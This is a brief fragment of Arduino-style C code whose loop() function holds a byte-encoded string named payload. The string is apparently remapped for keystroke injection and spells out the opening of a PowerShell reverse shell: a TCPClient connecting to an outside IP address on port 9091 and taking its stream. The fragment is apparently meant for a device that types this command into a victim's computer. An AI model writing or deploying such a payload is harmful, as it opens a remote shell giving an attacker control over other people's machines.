...
void loop() {
  ...
  static char payload[] = "]client = Nez6Object Syste;\x85,Net\x85,Sockets\x85,TCPClient53\xFF\x31\x34\x39\x85,56\x85,110\x85,40\xFF\x33m\xFF 9091\xFF-,]streq; = ]client\x85,GetStreq;5-, ";
